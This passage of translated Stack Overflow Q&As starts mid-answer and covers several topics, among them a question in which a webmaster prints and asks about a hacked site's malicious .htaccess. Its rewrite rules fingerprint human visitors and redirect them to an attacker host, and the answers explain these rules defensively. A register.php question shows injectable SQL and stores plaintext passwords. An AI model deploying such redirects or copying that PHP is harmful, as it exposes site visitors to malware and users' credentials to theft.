您必须为您的战争插件启用过滤：

```
<plugin>
   <artifactId>maven-war-plugin</artifactId>
   <version>2.1.1</version>
   <configuration>
      <webResources>
         <resource>
            <directory>src/wsdl</directory>
            <filtering>true</filtering>
         </resource>
      </webResources>
      ... 
```

之后您可能需要更新您的 Maven 项目配置。

![在此处输入图像描述](../Images/1476124af544d2545299f90bfc5e5edd.png)

# php - 错误消息“您无权访问此服务器上的 /register.php”？

> ID：13841050
> 
> 赞同：0
> 
> 时间：2012-12-12T13:37:59.063
> 
> 标签：php, registration

尝试使用我的`register.php`脚本时出现以下错误。

```
Forbidden

You don't have permission to access /register.php on this server.

Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. 
```

这是脚本：

```
<?php //error_reporting(E_ALL ^ E_NOTICE); ini_set('display_errors', true);
include('header.php');
if(isset($_POST['register'])){
foreach($_POST as $key => $value) {
    $sec[$key] = filter($value);
}

$verificare1 = mysql_query("SELECT * FROM `users` WHERE `login`='{$sec['user']}' OR `email`='{$sec['email']}'");
$verificare = mysql_num_rows($verificare1);

if ($verificare > 0) {
$mesaj = "<div class=\"error\">ERROR: Username or email already registered!</div>";
}else if (!isUserID($sec['user'])) {
$mesaj = "<div class=\"error\">ERROR: Username is incorrect!</div>";
}else if(!isEmail($sec['email'])) {
$mesaj = "<div class=\"error\">ERROR: Enter a valid email address!</div>";
}else if (!checkPwd($sec['password'],$sec['password2'])) {
$mesaj = "<div class=\"error\">ERROR: Passwords do not match!</div>";
}else{
if(isset($_COOKIE['PlusREF'])){
$ref = $_COOKIE['PlusREF'];
$user1 = mysql_query("SELECT * FROM `users` WHERE `id`='{$ref}'");
$user = mysql_fetch_object($user1);
mysql_query("INSERT INTO `referals`(user,referal,date) values('{$user->login}','{$sec['user']}',NOW())");
}
$activare = rand(000000000, 999999909);
mail($sec['email'],"Welcome to ExchangeBoost.com","
Hello,

Thank you for signing up at ExchangeBoost.com. 

Click on the link below in order to activate your account: 
{$site->site_url}/activate.php?cod={$activare}

If you would like after you activate your account you can buy coins in the UserCP at a very low rate.

Thank you!","From: ExchangeBoost.com <{$site->site_email}>");
$final = VisitorIP();
$passa = $sec['password'];
$passc = MD5($passa);
mysql_query("INSERT INTO `users`(email,login,coins,IP,pass,passdecoded,ref,signup,activate) values('{$sec['email']}','{$sec['user']}','100','$final','$passc','$passa','{$ref}',NOW(),'{$activare}')")or die(mysql_error());
$mesaj = "<div class=\"success\">Registered! You need to confirm your email address now!</div>";
}}
?>  
<div class="main">

            <div class="content-ex">

<div class="msg"><?echo $mesaj;?></div>
<form action="" method="post">

                         <p>
                             <label>Username</label><br/>
                             <input class="text big" type="text" value="" name="user"/>
                         </p>
                         <p>
                             <label>Email</label><br/>
                             <input class="text big" type="email" value="" name="email"/>
                         </p>
                         <p>
                             <label>Password</label> <br/>
                             <input class="text big" type="password" value="" name="password"/>
                         </p>
                         <p>
                             <label>Repeat Password</label> <br/>
                             <input class="text big" type="password" value="" name="password2"/>
                         </p>
                          <p>

                            <input type="submit" class="bbut" value="Register" name="register" />
                          </p>

                    </form>

            </div>
<div class="signin"> 
               <h2>Sign In</h2>
                           <form method="post">

<input class="text big" type="text" value="Username:" name="login">
<input class="text big" type="password" value="Password:" name="pass">           

<div class="buttons">

                            <input type="submit" class="gbut" name="logare" value="Login" /><a class="bbut" href="register.php" name="logare" value="Register">Register</a>
<br><br>
<a href="recover.php">Dude, I forgot my password!</a>
</div>                                        
</form>

            </div>

        </div>

<?include('footer.php');?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:40:58.197

检查文件是否真的存在。它存在然后检查你的`.htaccess`设置。`404 Error`表示未找到您要查找的页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:43:11.707

听起来可能是文件权限错误。您在 Windows 或 *nix 托管环境中吗？文件集的权限是什么？确保 Web 用户具有读取文件的权限。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T13:58:13.690

这是两个错误

1.  如错误消息所述，您无权访问路径中的文件。-> 在这种情况下，您是指正在处理请求的网络服务器进程，例如 apache。您需要检查文件权限，确保该文件可以被 Web 服务器读取。进一步，你需要检查路径是否正确，它直接在web根目录中查找register.php
2.  您的网络服务器配置为提供错误 (html) 文档，但找不到此错误文档（例如 404.html）

# xcode - iPhone：NSLog self.window.rootviewcontroller

> ID：13841056
> 
> 赞同：0
> 
> 时间：2012-12-12T13:38:34.267
> 
> 标签：xcode, nslog, uiapplicationdelegate

我需要知道我的 winow.rootviewcontroller 名称。

例如

```
 UITabBarController *demoTabBarController = [[UITabBarController alloc] init];
    [self.demoTabBarController setDelegate:self];
    self.demoTabBarController.viewControllers = [NSArray arrayWithObjects:mainNavController, searchView, challengeView, nil];
    self.window.rootViewController = self.demoTabBarController; 
```

所以在 NSLog 我想要 demoTabBarController 作为结果。有什么办法可以实现吗？

请注意，我不想要 rootviewcontroller 的类名。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T13:47:14.227

demoTabBarController 只是指向您的 UITabBarController 的指针的名称。它实际上并没有存储在内存中。

您可以使用 [self.window.rootViewController className] 获取类名，但这应该返回 UITabBarController

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:51:37.823

不是直接的。指针变量不保存有关其他指针变量为其提供对象引用的任何信息。如果您需要某种关于对象历史的标识信息，则必须子类化`UITabBarController`并保存要在自定义类中显示的内容。

（如果你描述了为什么你认为这是有用的，那么有人可能有另一种方法来解决更基本的问题。）

# amazon-web-services - 使用 AWS SNS 和 SQS 的扇出模式是否可靠？

> ID：13841060
> 
> 赞同：10
> 
> 时间：2012-12-12T13:38:53.227
> 
> 标签：amazon-web-services, amazon-sqs, amazon-sns

AWS 博客说它[支持扇出消息模式](http://aws.typepad.com/aws/2012/11/queues-and-notifications-now-best-friends.html)。为此，我将 SQS 队列订阅到 SNS 主题。
现在我的问题是，SNS 向 SQS 发布消息可靠吗？如在，是否保证 SNS 将始终成功地在所有订阅的 SQS 队列上发布通知（消息），在每次发布到 SNS 时？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-09T18:16:53.143

我相信这是一项有保证的服务，至少我上次与 SNS/SQS 团队会面时是这样告诉我的。我们大量使用 SNS->SQS 绑定

# c++ - OpenNI 眼动追踪

> ID：13841062
> 
> 赞同：3
> 
> 时间：2012-12-12T13:38:57.360
> 
> 标签：c++, openni, eye-tracking

我正在使用 OpenNI 开发一个项目。

我已经做了一个骨架跟踪，但我找不到如何使用这个库实现眼动跟踪。

有可能还是我必须让自己适应使用 Opencv？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:44:50.570

我认为您必须使用 Opencv，因为 Openni 没有实现眼动追踪功能。

看看[这个项目](http://www.codeproject.com/Articles/26897/TrackEye-Real-Time-Tracking-Of-Human-Eyes-Using-a)！

# .htaccess - 客户端站点的 htaccess 被黑 - 不完全确定这是做什么的或从这里做什么

> ID：13841064
> 
> 赞同：9
> 
> 时间：2012-12-12T13:38:59.110
> 
> 标签：.htaccess, web, hosting, malware

我们的一个客户网站已被黑客入侵，.htaccess 文件被替换为以下内容。

任何人都可以准确地分解这是在做什么吗？

据我所知，它看起来像是在获取推荐页面，然后是用户代理，它设置了一个名为 jpg 的 cookie，然后将您重定向到 siknsty.malicioussite.com，然后尝试下载一些恶意软件，然后再将您推荐回原始推荐网站（所以你的路径是谷歌>恶意软件页面>谷歌）

如果设置了 jpg cookie，它不会向您推荐任何地方，因为它假定您已经下载了恶意软件。（这可能是错误的 - 我认为它应该将您引向下面列出的重定向页面）。

我不确定其余的，或者它是否使用 .htaccess 将 zip 文件屏蔽为 jpgs（我想我没看错）......

有什么想法吗？

另外，任何想法它是如何在服务器上产生的？所有人的权限都设置为 0644，这发生在同一帐户下的 Windows 和 Linux 服务器上。

星期三早上巴拉切啊喂。

哦，不要去那个网站。

```
<IfModule prefork.c>
RewriteEngine On
RewriteCond %{REQUEST_METHOD}   ^GET$
RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?        (tweet|twit|linkedin|instagram|facebook\.|myspace\.|bebo\.).*$ [NC,OR]
RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(hi5\.|blogspot\.|friendfeed\.|friendster\.|google\.).*$ [NC,OR]
RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(yahoo\.|bing\.|msn\.|ask\.|excite\.|altavista\.|netscape\.).*$ [NC,OR]
RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(aol\.|hotbot\.|goto\.|infoseek\.|mamma\.|alltheweb\.).*$ [NC,OR]
RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(lycos\.|metacrawler\.|mail\.|pinterest|instagram).*$   [NC]
RewriteCond %{HTTP_REFERER}     !^.*(imgres).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(bing|Accoona|Ace\sExplorer|Amfibi|Amiga\sOS|apache|appie|AppleSyndication).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Archive|Argus|Ask\sJeeves|asterias|Atrenko\sNews|BeOS|BigBlogZoo).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Biz360|Blaiz|Bloglines|BlogPulse|BlogSearch|BlogsLive|BlogsSay|blogWatcher).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Bookmark|bot|CE\-Preload|CFNetwork|cococ|Combine|Crawl|curl|Danger\shiptop).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Diagnostics|DTAAgent|EmeraldShield|endo|Evaal|Everest\-Vulcan).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(exactseek|Feed|Fetch|findlinks|FreeBSD|Friendster|Fuck\sYou|Google).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Gregarius|HatenaScreenshot|heritrix|HolyCowDude|Honda\-Search|HP\-UX).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(HTML2JPG|HttpClient|httpunit|ichiro|iGetter|IRIX|Jakarta|JetBrains).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Krugle|Labrador|larbin|LeechGet|libwww|Liferea|LinkChecker).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(LinknSurf|Linux|LiveJournal|Lonopono|Lotus\-Notes|Lycos|Lynx|Mac\_PowerPC).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Mac\_PPC|Mac\s10|macDN|Mediapartners|Megite|MetaProducts).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Miva|Mobile|NetBSD|NetNewsWire|NetResearchServer|NewsAlloy|NewsFire).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(NewsGatorOnline|NewsMacPro|Nokia|NuSearch|Nutch|ObjectSearch|Octora).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(OmniExplorer|Omnipelagos|Onet|OpenBSD|OpenIntelligenceData|oreilly).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(os\=Mac|P900i|panscient|perl|PlayStation|POE\-Component|PrivacyFinder).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(psycheclone|Python|retriever|Rojo|RSS|SBIder|Scooter|Seeker|Series\s60).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(SharpReader|SiteBar|Slurp|Snoopy|Soap\sClient|Socialmarks|Sphere\sScout).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(spider|sproose|Rambler|Straw|subscriber|SunOS|Surfer|Syndic8).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Syntryx|TargetYourNews|Technorati|Thunderbird|Twiceler|urllib|Validator).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Vienna|voyager|W3C|Wavefire|webcollage|Webmaster|WebPatrol|wget|Win\s9x).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Win16|Win95|Win98|Windows\s95|Windows\s98|Windows\sCE|Windows\sNT\s4).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(WinHTTP|WinNT4|WordPress|WWWeasel|wwwster|yacy|Yahoo).*$   [NC]
RewriteCond %{HTTP_USER_AGENT}  !^.*(Yandex|Yeti|YouReadMe|Zhuaxia|ZyBorg).*$   [NC]
RewriteCond %{REQUEST_FILENAME} !.*jpg$|.*gif$|.*png|.*jpeg|.*mpg|.*avi|.*zip|.*gz|.*tar|.*ico$ [NC]
RewriteCond %{REMOTE_ADDR}      !^66\.249.*$ [NC]
RewriteCond %{REMOTE_ADDR}      !^74\.125.*$ [NC]
RewriteCond %{HTTP_COOKIE}      !^.*Jpg.*$ [NC]
RewriteCond %{HTTP_USER_AGENT}  .*(Windows|Macintosh|iPad|iPhone|iPod|Android).* [NC]
RewriteCond %{HTTPS}        ^off$
RewriteRule .* - [E=Jpg:%{TIME_SEC}]
RewriteRule .* - [E=HjT:siknsty.autoeventregistration.com]

RewriteCond %{ENV:Jpg} 0
RewriteRule ^.* http://%{ENV:HjT}/lg.php?bannerid=2168&campaignid=1049&zoneid=54&loc=1&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=3dc202f6d9  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:9516:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 1
RewriteRule ^.* http://%{ENV:HjT}/www/app_full_proxy.php?app=275724075798066&v=1&size=z&cksum=e086bd606215518aed83711368bbecf5&src=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:11607:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 2
RewriteRule ^.* http://%{ENV:HjT}/__utm.gif?utmwv=5.3.3&utms=10&utmn=620248474&utmhn=malang.olx.co.id&utme=8(2!entryPage)9(2!jobs/staticsearch/190\%3Fsearchbox\%3Dretailer\%26section\%3Dst-190)11(2!1)&utmcs=UTF-8&utmsr=1024x768&utmvp=1024x638&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.3\%20r181&utmdt=Gambar\%20MAZDA\%20MR\%20TAHUN\%201992.\%20BIRU\%20-\%20Malang\%20-\%20Mobil&utmhid=312516024&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=vehicles/itemimages/withImg/0&utmac=UA-1240664-1&utmcc=__utma\%3D209359949.1036501994.1340939688.1340939688.1340955051.2\%3B\%2B__utmz\%3D209359949.1340955051.2.2.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dgambar\%2520mobil\%2520mazda\%2520th\%25201992\%3B&utmu=ujGgAAAAIAAAAAAAAAAAAAB~  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:9398:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 3
RewriteRule ^.* http://%{ENV:HjT}/_xhr/ugccomments/?method=get_context_uuid&context_id=8064b73e-890d-3876-9ce5-c5f7c98574aa&0.2617028157370842&baseurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:9127:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 4
RewriteRule ^.* http://%{ENV:HjT}/ping?h=thefrisky.com&p=/photos/357-12-stars-who-regret-having-plastic-surgery/lisa-rinna-lips-m-jpg-2/&u=i5r1cquurwfzcui1&d=thefrisky.com&g=25328&n=1&f=1&c=0&x=114&y=1865&w=638&j=45&R=1&W=0&I=0&E=0&v=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&b=4187&t=72n4jkji2m79sf6m&V=6&D=nygdmayh2yyvp9w3&i=12\%20Stars\%20Who\%20Regret\%20Having\%20Plastic\%20Surgery\%20Lisa\%20Rinna\%20\%E2\%80\%93\%20The\%20Frisky&_  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:11948:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 5
RewriteRule ^.* http://%{ENV:HjT}/__utm.gif?utmwv=5.3.2&utms=3&utmn=490784565&utmhn=www.wego.co.id&utme=8(2!Hotels*Google\%20search\%20position)9(2!Details\%20Overview*5)&utmcs=UTF-8&utmsr=1024x768&utmvp=1007x612&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=11.2\%20r202&utmdt=Aston\%20Cengkareng\%20City\%20Hotel\%20\%26\%20Conference\%20Center\%2C\%20Jakarta\%20-\%20Bandingkan\%20tarif\%20kamar\%20-\%20Wego.co.id&utmhid=1324439502&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/hotel/indonesia/jakarta/aston-cengkareng-city-hotel-and-conference-center--133090&utmac=UA-29994605-1&utmcc=__utma\%3D1.786375144.1340094774.1340094774.1340094774.1\%3B\%2B__utmz\%3D1.1340094774.1.1.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dstandard\%2520superior\%2520twin\%2520room\%2520aston\%2520hotel\%3B&utmu=qzGggCAAAAAAAAAAAAAAAAB~  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:10955:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 6
RewriteRule ^.* http://%{ENV:HjT}/delivery/lg.php?bannerid=30550&campaignid=4402&zoneid=1917&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=dbd1f7d293  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:9621:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 7
RewriteRule ^.* http://%{ENV:HjT}/api/getCount2.php?cb=stButtons.processCB&refDomain=www.mangahere.com&refQuery=manga/fly_high/v03/c013/37.html&pgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pubKey=e47efe7d-147b-4731-ac42-9838ccdc52f2&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:10798:/:0:HttpOnly]
RewriteCond %{ENV:Jpg} 8
RewriteRule ^.* http://%{ENV:HjT}/pingjs/?k=f6ckilz7r2ss&t=Komik\%20Fairy\%20Tail\%20\%7C\%20Chapter\%20288\%20289\%20Hal\%2016\%20-\%20Baca\%20Manga\%20Bahasa\%20Indonesia\%20Online&c=s&y=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&a=-1&r=978836  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:11234:/:0:HttpOnly]
<!-- Conditions 10 - 58 removed to post on stackoverflow -->
RewriteCond %{ENV:Jpg} 59
RewriteRule ^.* http://%{ENV:HjT}/delivery/lg.php?bannerid=31662&campaignid=2&zoneid=1884&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=af167e7f1f  [R=302,NE,L,CO=Jpg:%{ENV:Jpg}:%{HTTP_HOST}:9285:/:0:HttpOnly]

</IfModule>
#a77342b1677255ef6afc9a0dbec166f633c2b44166559458c71fb4e7 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-12T14:03:27.333

它根据第二次随机选择重定向之一。因此，为什么它们从 0 变为 59。

我认为你是对的，它设置了一个 cookie，这样它就不会再对同一个受害者做同样的事情。

第一组规则正在做一些事情，例如消除所有请求以 .jpg、.zip 等结尾的文件的人，可能是为了确保在重定向之前确实有人在查看浏览器。UserAgent 也是排除项（注意每行开头的 !）——各种网络蜘蛛以及一些它不感兴趣或无法感染的操作系统和客户端。它还要求用户代理包括以下之一

```
Windows|Macintosh|iPad|iPhone|iPod|Android 
```

并且推荐人是流行网站和搜索引擎的一长串名称之一。这可能再次确保浏览器背后有一个人，如果他们收到垃圾邮件的报酬，或者它可能与使用您的网站有关，例如点击农场。

一个有趣的事情是它忽略的 IP 块列表：

```
RewriteCond %{REMOTE_ADDR}      !^66\.249.*$ [NC]
RewriteCond %{REMOTE_ADDR}      !^74\.125.*$ [NC] 
```

这些可能包括站点的地址，以便站点的所有者（可能）不会注意到损坏，或者它可能会为您提供有关攻击者所在国家/地区的线索。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T14:34:10.477

它不是直接/破坏性攻击，而是一种悄悄引入对最终用户来说并不明显的恶意软件的狡猾方式。

看起来它是根据时间随机循环的......（你显然是某种理解方式）：

1.  关闭网站，直到你理解它
2.  从最近的备份中比较/恢复，看看你的系统还有什么变化
3.  检查您的日志文件
4.  锁定所有基于服务器的帐户并循环所有密码

发生这种情况有多种可能的方式，包括：

1.  服务器帐户已被暴力破解（例如 ftp/telnet/user 或其他普通帐户）
2.  您的代码提供/创建了一个漏洞，通过该漏洞某人获得了访问权限（尽管如果您的权限设置为 644，那么他们可能以某种方式获得了 root/用户帐户访问权限，否则他们将无法覆盖文件）。
3.  过时的软件（带有安全漏洞）已被利用
4.  依赖不安全的用户帐户会话

以下是一些有助于避免此类攻击的常见元素，尽管您可以在 Web 上找到用于锁定 linux/win 服务器的安全方法：

*   在关键系统文件上安装tripwires（一个开源选项：[http](http://www.tripwire.org/) ://www.tripwire.org/ ）
*   安装软件/安全更新（[Secunia](http://secunia.com/community/advisories/)是新问题的长期来源）
*   删除/停止所有不需要的帐户/服务
*   使用网络边缘的硬件来保护您的服务器免受外部访问（例如，具有智能安全功能的路由器 - 尽管这很昂贵）
*   阻止从您使用的静态 IP 范围以外的静态 IP 范围访问服务器
*   进行渗透测试以发现您的服务器的弱点并关闭它们
*   *在n*次尝试使用 iptables 或等效项后，通过阻止对帐户的尝试来删除外部访问

# ruby-on-rails - Solr fulltext search in production - which is better sunspot:solr bundled solution or standalone tomcat+solr?

> ID：13841068
> 
> 赞同：4
> 
> 时间：2012-12-12T13:39:21.043
> 
> 标签：ruby-on-rails, tomcat, solr, full-text-search, sunspot-solr

We are utilizing sunspot's Solr gem for a while in development mode. The application is now needs to be moved to production environment.

**Are there any cons of setting up solr in production environment using the bundled sunspot gem ?**

I generally like tomcat + solr idea but it's more complex to set up.

**Sunspot bundled gem is easy. Provided that we have 1 rails project in 3 stages (staging,production,QA), 2 app servers and one db/solr server one has to** :

1.  push rails project to db server
2.  launch solr on db server in production environment with bundle exec rake sunspot:solr:start for (we just use different port for each solr instance)
3.  reindex with rake sunspot:solr:reindex
4.  modify sunspot.yml for app server to make them connect to db server on specific stage port

Above is applicable for X instances of production/staging solrs.

**Tomcat6 + Sunspot is not so easy and time/result effective. As I understand (fix me) one has to :**

1.  Install and maintain tomcat on db server
2.  Provided that we want to have 3 solr instances - deploy 3 solr wars with separate solrs (or use the multicore solr which is quite difficult to set up)
3.  deploy the rails project onto the db server
4.  Everytime we change our schema/configuration/whatever in rails - we have to take care of generating solr xmls and confs and copy it to tomcat webapps
5.  Modify the directories in solr conf/xml so it points to index files etc.
6.  Reload tomcat solr application instance on every rails deploy what includes some scripting and "non-rails" approach to deployment procedure :)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:03:40.333

I did something similar lately and had to answer the same questions. My problem space looked like having two languages (so preferably two cores and maybe more for other search options in future), having to index data over several table and search/count facets, partly in hierarchical structures like product groups and hierarchical tags like car_brand/model/type/build_year.

As far as I have seen sunspot works best (only) if you have relative 'flat' data, at best simply have to define for a single model which fields to use. The moment you need to combine several models into a single document for facets, it becomes difficult. (But since I didn't use Sunspot I can't really tell for sure). You can (and should) still use the rsolr gem for the communication with Solr. But if you use Sunspot in development, it is most likely working for you anyway.

For your details about the tomcat thing:

1.  Install and maintain tomcat on db server

yes, some work but can be handled

1.  Provided that we want to have 3 solr instances - deploy 3 solr wars with separate solrs (or use the multicore solr which is quite difficult to set up)

I used multi core. It's not really difficult to set up. You are better off learning a bit about Solr configuration anyway. Largest part of multi core is just having two sub directories that contain essentially the same set of XML config files.

1.  deploy the rails project onto the db server

have to do this anyway :)

1.  Everytime we change our schema/configuration/whatever in rails - we have to take care of generating solr xmls and confs and copy it to tomcat webapps

Yes, write a few scripts. Alternately you could have a git repo that contains the tomcat/solr folders and Rails project folder or symlink those folders. I haven't found a good solution yet and have to copy a bit stuff once in a while.

1.  Modify the directories in solr conf/xml so it points to index files etc.

yep, a few symlinks can help to keep things easy

1.  Reload tomcat solr application instance on every rails deploy what includes some scripting and "non-rails" approach to deployment procedure :)

Only if the deploy actually changes anything related to your search. Have a few scripts. There are Rails deployment solutions that would help, but as I do not mind to do a few things manually I didn't bother to install.

All in all I think I have more control and insight into the configuration of Solr and can better use some of it's more complex features like facets with hierarchies. Actually Solr may look a bit complicated at first, but after some time you get into it and then it becomes a great tool.

# sql - 这个多重内连接查询有什么问题？

> ID：13841074
> 
> 赞同：0
> 
> 时间：2012-12-12T13:39:34.647
> 
> 标签：sql, ms-access, join, recursion

我正在尝试执行下面的 SQL 查询（在 Access DB 中），但出现类型不匹配错误。

```
SELECT S1.[Main Project] AS Company, S1.[Main Link] AS Project, S1.[Name] AS Milestone, S1.[Start] As MilestoneDueDate, 
S2.[Name] As Successor1, S2.[Start] as SuccessorDueDate1, 
S3.[Name] As Successor2, S2.[Start] as SuccessorDueDate2, 
S4.[Name] As Successor3, S2.[Start] as SuccessorDueDate3, 
S5.[Name] As Successor4, S2.[Start] as SuccessorDueDate4, 
S6.[Name] As Successor5, S2.[Start] as SuccessorDueDate5, 
S7.[Name] As Successor6, S2.[Start] as SuccessorDueDate6, 
S8.[Name] As Successor7, S2.[Start] as SuccessorDueDate7, 
S9.[Name] As Successor8, S2.[Start] as SuccessorDueDate8, 
S10.[Name] As Successor9, S2.[Start] as SuccessorDueDate9, 
S11.[Name] As Successor10, S2.[Start] as SuccessorDueDate10

FROM ((((((((((Sheet1 AS S1 
INNER JOIN Sheet1 AS S2 
ON S1.[Outcoming Task 1] = S2.[ID])
INNER JOIN Sheet1 AS S3 
ON S1.[Outcoming Task 2] = S3.[ID])
INNER JOIN Sheet1 AS S4 
ON S1.[Outcoming Task 3] = S4.[ID])
INNER JOIN Sheet1 AS S5 
ON S1.[Outcoming Task 4] = S5.[ID])
INNER JOIN Sheet1 AS S6 
ON S1.[Outcoming Task 5] = S6.[ID])
INNER JOIN Sheet1 AS S7 
ON S1.[Outcoming Task 6] = S7.[ID])
INNER JOIN Sheet1 AS S8 
ON S1.[Outcoming Task 7] = S8.[ID])
INNER JOIN Sheet1 AS S9 
ON S1.[Outcoming Task 8] = S9.[ID])
INNER JOIN Sheet1 AS S10 
ON S1.[Outcoming Task 9] = S10.[ID])
INNER JOIN Sheet1 AS S11
ON S1.[Outcoming Task 10] = S11.[ID])

WHERE S1.Start >S2.[Start]
OR S1.Start >S3.[Start]
OR S1.Start >S4.[Start]
OR S1.Start >S5.[Start]
OR S1.Start >S6.[Start]
OR S1.Start >S7.[Start]
OR S1.Start >S8.[Start]
OR S1.Start >S9.[Start]
OR S1.Start >S10.[Start]
OR S1.Start >S11.[Start]

ORDER BY S1.[Main Project] 
```

我是否正确使用了内部连接？

我知道这个表很糟糕（实际上开发它的人应该创建了一个关系表），但它就是这样:(

有没有更优雅的方法来解决它？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:55:15.963

类型不匹配表明 Access 正在尝试比较两种不同类型的事物。可能是您的 20 个比较语句中的一个或多个导致了这种情况。我建议您尝试使用简单的查询来重现此错误，例如：

```
select 1 from Sheet1 as S1 inner join Sheet1 as S2
   on S1.[Outcoming Task 1] = S2.[ID]; 
```

以这种方式测试不同的字段，直到您看到类型不匹配的位置。

至于更优雅的解决方案，这取决于您要做什么。如果您使用此查询目标的描述更新您的问题，我们可以提供更好的解决方案。

如果您必须对这些数据进行大量工作，我建议您尽快将其从错误格式中删除。如果您可以重组源文件，那就太好了。如果不是，那么创建自己的以逻辑方式格式化的临时表并使用它们来完成您需要做的任何工作仍然是值得的。

# android - 使用 DefaultHttpClient 进行抢先式身份验证

> ID：13841087
> 
> 赞同：1
> 
> 时间：2012-12-12T13:40:22.073
> 
> 标签：android, authorization, ntlm, apache-httpclient-4.x, preemptive

我想使用 NTLM 为 DefaultHttpClient 实现抢先式身份验证。我从[Dan Hounshell](http://danhounshell.com/blog/android-using-ntlm-authentication-with-httpclient/)找到了一个库，它可以正常进行身份验证。

但我无法弄清楚如何通过抢先身份验证来实现这一点。我用这个很酷的[答案找到了](https://stackoverflow.com/a/4328694/995926)[使用 Apache HttpClient 4 的 Preemptive Basic authentication](https://stackoverflow.com/q/2014700/995926)问题：

```
UsernamePasswordCredentials creds = new UsernamePasswordCredentials(username, password);
HttpRequest request = ...
request.addHeader(new BasicScheme().authenticate(creds, request)); 
```

不适合我的问题，但一个好主意。所以我尝试使用`NTLMSchemeFactory`创建一个新实例`AuthScheme`with 给了我这个`authenticate`功能。

```
NTCredentials ntc = new NTCredentials("example.com/user:pwd");
httpPost.addHeader(new NTLMScheme(new JCIFSEngine()).authenticate(ntc, httpPost)); 
```

当这个函数被调用时，我会得到一个异常：

> org.apache.http.auth.AuthenticationException：意外状态：未初始化

我该如何解决？

```
POST /login/ HTTP/1.1
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
Host: example.com
Connection: Keep-Alive
data=...

HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/7.5
